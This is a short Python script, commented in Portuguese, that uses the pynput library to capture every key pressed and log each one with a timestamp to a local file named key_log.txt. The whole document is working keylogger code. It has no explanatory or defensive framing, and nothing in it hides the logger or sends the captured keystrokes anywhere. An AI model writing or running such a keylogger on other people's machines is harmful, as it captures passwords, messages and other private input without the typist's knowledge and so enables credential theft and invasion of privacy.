#Importa bibliotecas
from pynput.keyboard import Key,Listener
import logging

#Define local onde os logs serão salvos
log_dir = ""

#Define formato dos logs
logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')

#Captura tecla pressionada
def on_press(key):
	logging.info(str(key))

#Aguarda pela próxima tecla
with Listener(on_press=on_press) as Listener:
	Listener.join()